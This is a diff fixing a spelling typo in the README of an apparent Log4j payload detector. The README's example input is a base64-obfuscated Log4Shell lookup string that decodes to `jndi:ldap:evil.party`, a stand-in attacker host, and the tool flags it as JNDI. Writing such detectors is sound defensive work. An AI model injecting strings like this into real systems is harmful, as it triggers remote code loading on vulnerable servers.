@@ -21,7 +21,7 @@ Here is an example detecting an obfuscated use of `jndi:`.
 $ ./log4j_interpreter
 Usage: ./log4j_interpreter [test string]
 $ ./log4j_interpreter 'hello ${base64:JHtqbmRpOmxkYXA6ZXZpbC5wYXJ0eX0=}'
-Substitued: hello jndi:ldap:evil.party
+Substituted: hello jndi:ldap:evil.party
 JNDI: true
 ENV: false
 Recursion Limit: false
@@ -31,7 +31,7 @@ Here is an example that allows a benign string to pass:
 
 ```
 $ ./log4j_interpreter 'a benign string ${base64:d2l0aCBzb21lIGJhc2U2NA==}'
-Substitued: a benign string with some base64
+Substituted: a benign string with some base64
 JNDI: false
 ENV: false
 Recursion Limit: false
